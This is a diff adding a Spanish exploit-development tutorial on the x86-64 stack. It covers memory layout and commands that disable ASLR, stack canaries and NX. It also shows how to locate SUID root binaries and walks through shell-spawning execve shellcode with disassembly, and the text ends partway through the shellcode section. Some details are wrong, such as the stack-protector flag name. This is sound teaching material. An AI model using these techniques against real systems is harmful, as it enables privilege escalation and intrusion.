@@ -1,0 +1,1643 @@
+/*
+	17/09/2019
+	Éste es un documento que muestra experimentos acerca del stack,
+	no es nada nuevo y nada que yo haya inventado, me tomé el antojo
+	de volcar en un documento información preciza sobre un asunto y
+	espero que el lector disfrute la lectura y los experimentos tanto
+	como yo lo disfrute al escribirlo.
+	Si encuentra algún error, alguna cosa a mejorar o quiere comentar
+	el asunto le ruego que me lo comunique carlosmaccarrone@gmail.com
+
+	Disculpe errores tipográficos, mi editor de texto está pidiendo
+	pasar al ropero y volver a vi.
+*/
+
+
+			XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+			 Sacudiendo el Stack por carl1tos
+			XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+[1]- Segmentación de la memoria de un programa
+   [1.1]- El segmento stack
+   [1.2]- Stack frame
+   [1.3]- Flujo de ejecución de una función
+   [1.4]- Arquitecturas de 32 bits y 64 bits
+   [1.5]- Consideraciones adicionales
+[2]- Escritura shellcode
+[3]- Stack buffer overflow
+   [3.1]- Cambiar el flujo de ejecución usando un buffer y un puntero
+   [3.2]- Inyectar código en un programa usando un buffer
+   [3.3]- Inyectar código en un programa usando una variable de entorno
+[4]- Stack integer overflow
+[5]- Evitar la prevención de ejecución de datos (bit NX)
+[6]- Format String
+
+
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[1]- Segmentación de la memoria de un programa
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	La segmentación de la memoria de un programa se divide en varias regiones:
+
+				|-------------------|	Direcciones Altas (H o High)
+				|		   mas allá			|
+				|-------------------|
+				|										|
+				|				stack				|
+				|-------------------|
+				|										|
+				|										|
+				|		 			...				|
+				|										|
+				|-------------------|
+				|										|
+				|		 		heap				|
+				|-------------------|
+				|										|
+				|				.bss				|
+				|-------------------|
+				|										|
+				|				.data				|
+				|-------------------|
+				|										|
+				|				.text				|
+				|-------------------|	Direcciones Bajas (L o Low)
+
+					Fig 1 - Memoria
+
+[*]	.text es fijado por el programa e incluye todas instrucciones en código maquina
+que compone el programa. Normalmente es de solo lectura y cualquier intento de
+escribir en ella dará como resultado un fallo de segmentación.
+
+[*]	.data contiene todas las variables globales o estaticas inicializadas.
+
+[*]	.bss contiene todas las variables globales o estadis no inicialiazadas.
+
+[*]	heap es un segmento reservado para la memoria dinámica. Para reservar memoria se
+puede utilizar por ejemplo malloc() en C.
+
+[*]	stack contiene variables locales, variables de referencia, argumentos pasados a
+las funciones y valores de retorno.
+
+[*]	mas allá son argumentos de línea de comandos y variables de entorno.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[1.1]- El segmento stack
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	El stack es una estructura ordenada de datos que permite almacenar y recuperar
+datos. El modo de acceso a sus elementos es de tipo LIFO (last in, first out).
+Ésto quiere decir que puedo acumular elementos en el stack y el último elemento que
+haya agregado, será el primero que pueda sacar. La dirección donde se colocará el
+siguiente elemento es almacenada en el registro stack pointer.
+
+Dependiendo de la implementación, el stack puede crecer hacia abajo es decir hacia
+direcciones de memoria más bajas (implementación descendente) o hacia arriba osea hacia
+direcciones de memoria más altas (implementación ascendente). El stack pointer también
+depende de la implementación. Puede apuntar a la dirección del último elemento agregado
+en el stack (implementación Full stack) o a la siguiente dirección libre en el stack
+(implementación Empty stack).
+
+		--------------		--------------		--------------		--------------
+		|	  	...		 |		|	  	...	 	 |		|		  ...	 	 |		|	  	...		 |
+		|------------|		|------------|		|------------|		|------------|
+		|	  	...		 |		|		  ...	 	 |		|		  ...		 |SP->|	  ...			 |
+		|------------|		|------------|		|------------|		|------------|
+		|    0x08 	 |SP->|    0x08 	 |		|    0x08 	 |		|    0x08 	 |
+		|------------|		|------------|		|------------|		|------------|
+		|	 	 0x07	 	 |		|	 	 0x07 	 |		|	 	 0x07 	 |		|	 	 0x07 	 |
+		|------------|		|------------|		|------------|		|------------|
+SP->|	 	 0x06 	 |		|		 0x06 	 |		|		 0x06 	 |		|		 0x06 	 |
+		|------------|		|------------|		|------------|		|------------|
+		|	  	...		 |		|		  ...	 	 |SP->|	  	...	 	 |		|	  	...		 |
+		|------------|		|------------|		|------------|		|------------|
+		|	  	...		 |		|	  	...		 |		|		  ...		 |		|	  	...		 |
+		|------------|		|------------|		|------------|		|------------|
+				full 							full 							empty 						empty
+		descendente 				ascendente	 			descendente 			ascendente
+
+					Fig 2 - Tipos de implementación del stack.
+
+El stack posee sólo dos instrucciones que son PUSH y POP. Push permite agregar un
+elemento donde apunte el SP y pop se utiliza para quitar del stack el elemento que
+SP está apuntando. El stack se constituye de stack frames que se pushean al llamar a
+una función y se popean al finalizarla.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[1.2]- Stack frame
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Cada vez que un programa ejecuta una función, procedimiento o sub-rutina, se
+genera una estructura de datos dentro del stack, llamada stack frame. Un stack frame
+es una porción de memoria dedicada para una sub-rutina específica.
+
+								|-------------------|	Direcciones Altas (H o High)
+								|										|
+								|	 		stack frame		|
+								|	   	anterior 			|
+								|										|
+								|-------------------|
+						----|										|
+						|		|	  	argumentos		|
+						|		|-------------------|
+						|		| 	 instruction		|
+						|		|	   pointer	(IP)	|
+						|		|-------------------|
+	 Stack<---|		| frame base pointer|
+	 Frame		|		| 		 	(BP)				|
+						|		|-------------------|
+						|		|										|
+						|		| espacio reservado	|
+						|		|				para				|
+						|		| variables locales	|
+						----|										|
+								|-------------------|
+								|										|	Direcciones Bajas (L o Low)
+
+			Fig 3 - Dos stack frames contiguos.
+
+[*] stack frame anterior contiene un puntero hacia el stack frame anterior.
+
+[*] argumentos, aquí se reservan los argumentos que se le pasan a las funciones.
+
+[*] el registro IP es el contador del programa (program counter) y almacena la
+	dirección de la próxima instrucción a ser ejecutada.
+
+[*] el registro BP apunta hacia el primer elemento del stack frame que es la base.
+	El SP puede cambiar durante la ejecución de una función a medida que se agregan
+	o sacan elementos del stack. El BP no cambia a lo largo de la función por ello
+	el código para acceder a las variables locales dentro de una función se genera
+	en términos de desplazamientos desde el registro BP.
+
+[*] el espacio reservado se usa para almacenar variables locales de la función.
+
+Cuando una función A llama a otra función B, se crea un stack frame para la función B
+que contiene parámetros, las variables locales y la dirección de retorno.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[1.3]- Flujo de ejecución de una función
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	El flujo de ejecución de una función se puede pensar como si estuviese dividido en
+tres partes, prólogo, ejecución y epílogo.
+Al invocar una instrucción 'call miFuncion' en assembler se inicia el prólogo que es
+la parte responsable de crear el stack frame. Lo primero que la maquina hace es pushear
+el registro BP en el stack, para que el valor contenido en ese momento por BP pueda
+restaurarse más adelante. Luego asigna al registro BP el valor del registro SP para que
+se cree un nuevo stack frame en la cima del stack frame anterior. Despues, dependiéndo
+de la implementación del stack, se disminuye o aumenta el SP para dejar espacio a
+las variables locales de la función. Un ejemplo de las instrucciones del prólogo:
+
+	push   rbp
+	mov    rbp,rsp
+	sub    rsp,0x40
+
+Finalizado el prólogo la función carga en memoria los valores de sus variables y
+realiza el propósito para el que fue diseñado.
+
+Una vez que la función ya logro el objetivo de su existencia empieza el epílogo de la
+función que revierte las acciones realizadas en el prólogo y devuelve el control a
+la función que la invocó. Copia el contenido del registro BP en el registro SP, para
+que se libere el espacio reservado para variables locales. Saca (pop) el registro BP
+del stack, por lo que el stack restaura su valor antes del prólogo. Regresa a la
+función que la invocó, haciéndo pop del registro IP del stack frame anterior en el
+stack y saltando hacia la dirección que contiene.
+
+	mov		esp,ebp
+	pop 	ebp
+	ret
+
+o también equivalente en otras arquitecturas:
+
+	leave
+	ret
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[1.4]- Arquitecturas de 32 bits y 64 bits
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	La diferencia más notoria entre las dos arquitecturas es la longitud de los tipos
+de datos que ambas manejan. Los procesadores de 32 bits poseen 8 registros de propósito
+general y cada registro tiene una longitud de 32 bits. Los procesadores de 64 bits
+poseen 16 registros de propósito general y cada registro tiene una longitud de 64 bits.
+
+						|----------------------------------------------------------------|
+	64 bits 	|														 	RAX																 |
+						|----------------------------------------------------------------|
+
+												 										|--------------------------------|
+																	32 bits		|							 EAX							 |
+																						|--------------------------------|
+
+																														|----------------|
+																									16 bits 	|				AX			 |
+																														|----------------|
+
+																														|-------||-------|
+																									8 bits 		|   AH	||  AL	 |
+																														|-------||-------|
+
+En 64 bits ésta estructura la encontramos en los siguientes registros:
+RAX = Acumulador, RCX = Contador, RDX = Datos, RBX = Base, RSP = Stack Pointer,
+RBP = Stack Base Bointer, RSI = Origen, RDI = Destino y el EIP de 32 bits se
+amplió a 64 bits y se llama RIP, y se agregaron los registros de R8 a R15.
+Para los registros clásicos en 64 bits se puede acceder a sus contrapartes
+anteponiendo el/los bytes que desea trabajar.
+
+Los registros se identifican según su peso los empezados por r (registro) son de
+64 bits, los empezados por e (extendido) son de 32 bits, los empezados por una
+letra y terminados por x son de 16 bits, terminados en h (high) son de 8 bits
+y terminados en l (low) son de 8 bits también y son el byte menos significativo.
+
+En 64 bits se pueden usar más registros pero, en contraste con 32 bits los mismos datos
+ocupan ligeramente más espacio en memoria debido al crecimiento de los registros.
+
+En 64 bits los parámetros que reciban las funciones se pasan a través de los registros,
+en 32 bits se pushean y usan desde el stack. Los punteros en 64 bits pesan 8 bytes y
+en 32 bits pesan 4 bytes. Todos los tipos de punteros (void *, int *, char *, long * ,
+etc) tendrán el mismo tamaño, excepto los punteros de función.
+
+8 bits  = 1 byte
+32 bits = 4 bytes
+64 bits = 8 bytes
+
+Endianness o endianidad designa el formato en el que se almacenan los datos de más de
+un byte en un ordenador y se refiere a la organización de bytes en la memoria. Es de
+dos tipos: little endian y big endian. En una máquina "little endian", el byte menos
+significativo se almacena en la dirección de memoria inferior y el byte más
+significativo en las direcciones superiores, mientras que en una máquina "big endian",
+el byte más significativo se almacena en la dirección de memoria inferior y el menos
+significativo byte en las direcciones superiores. El problema es similar a los idiomas
+en los que se escriben de derecha a izquierda y viceversa.
+
+En 64 bits se estableció que solo los 48 bits menos significativos de una dirección
+de memoria lógica se utilizan para la traducción direcciones de memoria física (tabla
+de paginación). Los 16 bits más significativos de cualquier dirección virtual, es
+decir los bits 48 a 63, deben ser copias del bit 47. Si no se cumple este requisito,
+el procesador generará una excepción. Las direcciones que cumplen con esta regla se
+denominan "forma canónica". En una implementación típica de 48 bits, la dirección
+canónica se refiere a uno en el rango de 0x0000000000000000 a 0x00007FFFFFFFFFFF y
+0xFFFF800000000000 a 0xFFFFFFFFFFFFFFFF. Cualquier dirección fuera de este rango no
+es canónica.
+
+En una arquitectura de 32 bits, cada vez que se desborda un búfer, el registro IP se
+carga con la "dirección de retorno guardada" sobrescrita del stack, pero ese no es
+el caso con la arquitectura de 64 bits donde el registro IP debe cargarse con una
+dirección canónica de lo contrario, nunca se cargará.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[1.5]- Consideraciones adicionales
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Para el transcurso de la siguiente guía voy a estar usando un sistema operativo
+Linux Debian 9 Stretch, a escribir código en lenguaje C, compilarlo usando GCC y usar
+el depurador de GNU Debugger. Debido a las diferentes computadoras el set de
+instrucciones de lenguaje maquina de cada una puede ser distinto, pero mi computadora
+es little endian de 64 bits y usa una implementación de stack full descendente (ésto
+implica que si mi stack pointer apunta a la dirección 0x32 y hago push en el stack de
+algún valor, mi stack pointer ahora apuntará a la dirección 0x24 ).
+
+Para poder realizar los experimentos a continuación es conveniente saber la existencia
+de las siguientes herramientas:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Por defecto, todas las variables de entorno definidas por el usuario son locales.
+Utilizá el comando de exportación para exportar variables de entorno y funciones a
+programas secundarios.
+
+	$ VAR=127
+	$ export VAR
+
+o declarar la variable de forma átomica:
+
+	$ export VAR=127
+
+export -p [Muestra todas las variables globales]
+export -n VAR [Elimina la variable global VAR]
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Para saber que endianness es tu computadora:
+
+	$ lscpu
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Address Space Layout Randomization (ASLR o Aleatoriedad en la disposición del espacio
+de direcciones) es un mecanismo que ordena aleatoriamente el espacio de direcciones de
+un programa.
+
+[*]	Desactivado: 			$ echo 0 > /proc/sys/kernel/randomize_va_space
+[*] Activado(por defecto): 	$ echo 1 > /proc/sys/kernel/randomize_va_space
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Data Execution Policy (DEP - Prevención de ejecución de datos) o bit NX:
+Su función es prevenir que una aplicación se ejecute desde una región de memoria no
+ejecutable (posiblemente el SO marca las regiones ejecutables). Esto impide que ciertos
+exploits copien código en memoria vía buffer overflow.
+
+Cualquier región de memoria designada con el atributo NX significa que sólo se usa
+para datos, por lo tanto las instrucciones del procesador no pueden ni deben residir
+ahí. El stack se puede marcar como ejecutable pasando el indicador "-z execstack" con
+gcc durante la compilación.
+
+	$ gcc programa.c -z execstack
+
+Se puede usar el comando "readelf" para verificar si el stack está marcado como
+ejecutable:
+
+	$ readelf -l aplicacion_vulnerable
+
+GNU_STACK      	0x0000000000000000 0x0000000000000000 0x0000000000000000
+								0x0000000000000000 0x0000000000000000  RW     0x10
+									NO EJECUTABLE
+
+GNU_STACK      	0x0000000000000000 0x0000000000000000 0x0000000000000000
+								0x0000000000000000 0x0000000000000000  RWE    0x10
+									EJECUTABLE
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Canarios de stack:
+
+El canario es un valor conocido que se coloca entre un búfer y los datos de
+control en el stack para monitorear los desbordamientos del búfer. Cuando el búfer
+se desborda, el primer dato que se corrompe será el canario y, por lo tanto, una
+verificación fallida de los datos del canario alertará de un desbordamiento, que
+luego se puede manejar, por ejemplo, invalidando los datos corruptos. Esta técnica
+aumenta la dificultad de explotar un desbordamiento de búfer de stack porque obliga
+a obtener el control del registro IP por medios, como corromper otras variables
+importantes en el stack.
+
+Se pueden desactivar compilando:
+
+	$ gcc -fno-stack-protection programa.c
+
+Si la salida de:
+
+	$ readelf -s programa.out | grep __stack_chk
+
+devuelve algo, los canarios están activados.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Si quisiera compilar un probrama C en modo de 32 bits:
+
+	$ sudo apt-get install libc6-dev-i386
+	$ gcc -m32 programa.c
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Para compilar un programa C que genere código assembler:
+
+	$ gcc -S programa.c
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Las directivas cfi_ en assembler son información de call frame y son una extensión
+GNU Asm para gestionar call frames. Se pueden desactivar para ver el código maquina
+más limpio con el siguiente indicador:
+
+	$ gcc -S -fno-asynchronous-unwind-tables programa.c
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+El indicador -static le dice a gcc al momento de linkear los archivos de objetos,
+luego de compilar, en los sistemas que admiten linkeo dinámico, que anule -pie y
+evite la vinculación con bibliotecas compartidas. Se dice que un programa que no
+requiere dinamic linked library (DLL), es static linked.
+
+	$ gcc -static programa.c
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Por último y maś importante, cuando compilemos un programa.c le pasamos el
+indicador -g a gcc para poder ver el código en c desde gnu debugger.
+
+	$ gcc -g programa.c
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Shellcode (opcodes) es código máquina escrito en notación hexadecimal.
+
+Para ensamblar un programa assembler:
+
+	$ nasm -f elf64 programa.asm
+
+; Por defecto creará un archivo de objetos programa.o aunque no se le pase el
+indicador -o
+
+Para linkear un archivo de objetos y producir un ejecutable:
+
+	ld -s programa.o -o salida
+
+Para extraer el shellcode (opcodes) de un archivo de objetos:
+
+	$ for i in $(objdump -d programa.o | grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
+
+Debemos recordar que también hay notación hexadecimal embebida en el código maquina
+que representa caracteres del código ascii.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Acerca de linux tambien es bueno mencionar cómo cambiar los permisos, propietario y
+grupo de un archivo usando el comando change. El valor simbólico del change file mode
+se divide en cuatro secciones 1)tipo de archivo(archivo o directorio), 2)propietario,
+3)grupo, 4)otros. El tipo de archivo es un valor especial y es opcional, si no se
+declara el prompt interpretara el change a partir del propietario. El tipo de archivo
+es un valor especial que representa las siguientes opciones:
+
+0 - No options set
+1 - Sticky Bit set
+2 - SGID set
+3 - Sticky Bit and SGID Set
+4 - SUID set
+5 - Sticky Bit and SUID Set
+6 - SGID and SUID set
+7 - Sticky Bit GID and UID Set
+
+Con éste criterio podemos cambiar los permisos:
+
+	$ chmod 4777 archivo
+
+1) el tipo de archivo tiene el bit SUID seteado (superusuario)	(4)
+2) el propietario puede leer/escribir/ejecutar 					(7)
+3) el grupo puede leer/escribir/ejecutar 						(7)
+4) otros pueden leer/escribir/ejecutar 							(7)
+
+Confirme los cambios usando:
+
+	$ ls -l
+
+Y la salida es:
+
+	-rwsrwxrwx 1 carlitos carlitos 4096 Sep 11 2019 archivo
+
+Otra forma de activar el bit SUID:
+
+	$ chmod +s archivo
+
+Tenga en cuenta que el valor de los permisos simbólicos es -rwsrwxrwx, del cual se
+agrega la primera tríada "rws" con una "s" en lugar de una "x". Esta letra "s" indica
+que se ha establecido un SUID y que el ejecutable se ejecutará con privilegios de su
+propietario, si el propietario es root se ejecutará como root independientemente del
+usuario. Se ejecuta SETUID o SETGID en el código maquina del programa o se usa el
+comando sobre el archivo en cuestión. Por lo general, se requiere un SUID o SGID
+donde los usuarios necesitan privilegios elevados y no tienen acceso de administrador
+o root. Hay muchos binarios setuid en el sistema como sudo, su, chsh, passwd, ping,
+mount, etc.
+
+Para cambiar el propietario se usa change owner:
+
+	$ chown root archivo
+
+Y para cambiar el grupo se usa change group:
+
+	$ chgrp root archivo
+
+Puede usar el siguiente comando para buscar todos los binarios setuid propiedad de
+root en /.
+
+	$ find / -user root -perm -4000 2> /dev/null
+
+Buscar en /, propietario root, permisos de suid(-4000), el operador - para que muestre
+extrictamente los suid, 2> el archivo redirige stderr a /dev/null que es el
+dispositivo nulo, toma cualquier entrada que desee y la tira, para deshacernos de las
+búsquedas erróneas.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[2]- Escritura shellcode
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Vamos a tratar de escribir un shellcode que arroje un shell prompt con permisos de
+usuario. Para ello la función execve de C funciona muy bien. Si usted compila éste
+programa y lo ejecuta puede ver cómo accede a un shell de linux. Si el propietario del
+programa fuese root y tuviese permisos SUID se accedería a un shell de superusuario.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ejecutar.c
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	#include <stdio.h>
+
+	void main(){
+		execve("/bin/sh", NULL, NULL);
+	}
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	$ gcc -g -static ejecutar.c -o shellco
+	$ gdb shellco
+	$ (gdb) disassemble main
+
+	Dump of assembler code for function main:
+	   0x0000000000400aae <+0>:		push   rbp
+	   0x0000000000400aaf <+1>:		mov    rbp,rsp
+	   0x0000000000400ab2 <+4>:		mov    edx,0x0
+	   0x0000000000400ab7 <+9>:		mov    esi,0x0
+	   0x0000000000400abc <+14>:	lea    rdi,[rip+0x88a41]        # 0x489504
+	   0x0000000000400ac3 <+21>:	call   0x432400 <execve>
+	   0x0000000000400ac8 <+26>:	mov    eax,0x0
+	   0x0000000000400acd <+31>:	pop    rbp
+	   0x0000000000400ace <+32>:	ret
+	End of assembler dump.
+
+	(gdb) disas execve
+
+	Dump of assembler code for function execve:
+	   0x0000000000432400 <+0>:		mov    eax,0x3b
+	   0x0000000000432405 <+5>:		syscall
+	   0x0000000000432407 <+7>:		cmp    rax,0xfffffffffffff001
+	   0x000000000043240d <+13>:	jae    0x435ef0 <__syscall_error>
+	   0x0000000000432413 <+19>:	ret
+	End of assembler dump.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Estudiémos que pasa aquí:
+
+	   0x0000000000400aae <+0>:	push   rbp
+	   0x0000000000400aaf <+1>:	mov    rbp,rsp
+
+Prólogo de la función, empuja el valor actual del registro BP en el stack, escribe el
+valor del registro BP con el valor del registro SP y no hace falta hacer ninguna
+operación porque no hay variables locales. En éste caso es:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+La llamada a execve() comienza aquí, se cargan en orden inverso los argumentos
+que se van a pasar a execve en los registros EDX, RSI, RDI.
+
+
+	   0x0000000000400ab2 <+4>:		mov    edx,0x0
+
+Setea el registro EDX en 0 (NULL).
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	   0x0000000000400ab7 <+9>:		mov    esi,0x0
+
+Setea el registro ESI en 0 (NULL). (los primeros 32 bits del registro RSI)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	   0x0000000000400abc <+14>:	lea    rdi,[rip+0x88a41]        # 0x489504
+
+Asigna al registro RDI la dirección que resulta de sumar el valor del registro IP
+con 0x88a41 que es la dirección donde se encuentra la cadena '/bin/sh'.
+( RDI es igual a la dirección donde está la cadena '/bin/sh' )
+
+Podemos comprobarlo escribiendo en gdb el comando x (display) y s (cadena):
+
+	$ (gdb) x/s 0x489504
+	0x489504: 	"/bin/sh"
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	   0x0000000000400ac3 <+21>:	call   0x432400 <execve>
+
+Se llama a la función execve(), la instrucción call hace push de IP en el stack.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Dentro de la función execve:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	   0x0000000000432400 <+0>:		mov    eax,0x3b
+
+Copia 0x3b (59 decimal) en EAX. Este es el ID en el vector de interrupciones de
+linux de execve (linux system call tables).
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	   0x0000000000432405 <+5>:		syscall
+
+syscall es una instrucción especial de intel que reemplaza a la
+instrucción del de vector de interrupciones 'int 0x80' y sirve
+para invocar una llamada al sistema. El valor que retorne syscall
+se almacena en el registro RAX.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	   0x0000000000432407 <+7>:		cmp    rax,0xfffffffffffff001
+
+Se pregunta si el valor contenido en el registro ReturnAX es igual a fffffffffffff001.
+
+	   0x000000000043240d <+13>:	jae    0x435ef0 <__syscall_error>
+
+Genera un __syscall_error si se cumple la condición anterior
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	   0x0000000000432413 <+19>:	ret
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Return a main.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	   0x0000000000400ac8 <+26>:	mov    eax,0x0
+
+Limpia el registro EAX con ceros.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	   0x0000000000400acd <+31>:	pop    rbp
+
+El epílogo del main. (recordar que lo último que fue pusheado fue el
+registro IP, ahora rbp contiene la dirección a la que apuntaba IP
+al hacer call execve)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	   0x0000000000400ace <+32>:	ret
+
+Devuelve el control de ejecución a quién lo invocó.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+La llamada al sistema execve(), recibe tres parámetros a traves de tres registros que
+son RDI, RSI y RDX
+
+Lo primero que hace es setear en NULL RDX, y lo siguiente setear en NULL también RSI,
+éstos son los parámetros nulos que toma la función execve, y por último asigna la
+dirección donde se encuentra la cadena "/bin/sh" al registro RDI. La razón por la que
+la maquina sigue éste orden es porque el stack crece hacia abajo y cuando se ejecute
+la syscall de execve, la maquina tomará los datos en orden inverso (RDI -> RSI -> RDX)
+cómo la sintaxís de la función execve("/bin/sh", NULL, NULL).
+
+Entonces si nos fijamos ya tenemos todo lo que se necesita saber para escribir éste
+programa:
+
+	a) Setear en 0 el registro EDX.
+	b) Setear en 0 el registro ESI.
+	c) Tener la dirección que apunta a la cadena "/bin/sh" en el registro RDI.
+	d) Cargar 59 (0x3b) en el registro EAX.
+	e) Ejecutar la instrucción syscall.
+
+Y para lograr que el programa salga limpiamente si falla la syscall, debemos agregar
+una syscall de salida después de la llamada al sistema execve:
+
+sali.c
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	#include <stdlib.h>
+
+	void main(){
+		exit(0);
+	}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+No voy a desensamblar la salida, sólo voy a explicar que el ID de la función exit en
+el vector de interrupciones de linux (linux system call tables) es 60 (0x3c) y recibe
+cómo parámetro 1 en el registro RDI para asegurar que la salida fue éxitosa.
+
+Entonces quedaría:
+
+	a) Setear en 0 el registro EDX.
+	b) Setear en 0 el registro ESI.
+	c) Tener la dirección que apunta a la cadena "/bin/sh" en el registro RDI.
+	d) Cargar 59 (0x3b) en el registro EAX.
+	e) Ejecutar la instrucción syscall.
+	f) Setear en 1 el registro RDI.
+	g) Cargar 60 (0x3c) en el registro EAX.
+	h) Ejecutar la instrucción syscall.
+
+Tratando de ensamblar éste algoritmo, lo primero definimos donde empieza, ésto varía
+según el compilador en algunos hay que declarar global _start y escribir función
+_start: y en otros basta solamente con escribir main: y empezar a codear.
+
+
+global _start
+
+_start:
+	mov 	edx, 0x0 								; Setear en 0 el registro EDX
+	mov 	esi, 0x0 								; Setear en 0 el registro ESI
+
+																; Necesitamos un puntero que apunte a
+																; la cadena "/bin/sh"
+
+	mov     qword rbx, '/bin/sh' 	; Cargamos en RBX la cadena '/bin/sh'
+  push    rbx 									; Push al stack, RSP apunta a la cima
+    														; del stack
+
+  mov 	rdi, rsp 								; Cargamos en RDI el valor al que
+    														; apunta RSP ( que es la dirección
+    														; donde se encuentra la cadena )
+
+	mov 	eax, 0x3b 							; Cargamos 59 en el registro EAX
+	syscall 											; Invocamos la syscall y retornará
+																; un valor en RAX
+
+																; Iniciamos la salida
+	xor 	rax, rax 								; Por las dudas limpiamos RAX
+	mov 	rdi, 0x1 								; Setear en 1 el registro RDI
+	mov 	eax, 0x3c 							; Cargar 60 en el registro EAX
+	syscall 											; Invocamos la syscall
+
+
+Entonces si creamos un archivo llamada.asm con éste contenido y la compilamos y
+linkeamos el archivo de objetos que crea y probamos el ejecutable:
+
+	carlitos@lenovo:~/assembler/proyecto/prueba$ nasm -f elf64 llamada.asm
+	carlitos@lenovo:~/assembler/proyecto/prueba$ ld llamada.o -o llamada
+	carlitos@lenovo:~/assembler/proyecto/prueba$ ./llamada
+	$ whoami
+	carlitos
+	$ pwd
+	/home/carlitos/assembler/proyecto/prueba
+	$ cd ..
+	$ pwd
+	/home/carlitos/assembler/proyecto
+	$ exit
+	carlitos@lenovo:~/assembler/proyecto/prueba$
+
+Funciona bien, pero para nuestros propósitos sirve poco, y voy a explicar porque,
+verás si pruebas ver los opcodes del programa ./llamada
+
+	$ objdump -d -M intel llamada
+
+	llamada:     formato del fichero elf64-x86-64
+
+	Desensamblado de la sección .text:
+
+	0000000000400080 <_start>:
+	  400080:	ba 00 00 00 00       	mov    edx,0x0
+	  400085:	be 00 00 00 00       	mov    esi,0x0
+	  40008a:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f6e69622f
+	  400091:	73 68 00
+	  400094:	53                   	push   rbx
+	  400095:	48 89 e7             	mov    rdi,rsp
+	  400098:	b8 3b 00 00 00       	mov    eax,0x3b
+	  40009d:	0f 05                	syscall
+	  40009f:	48 31 c0             	xor    rax,rax
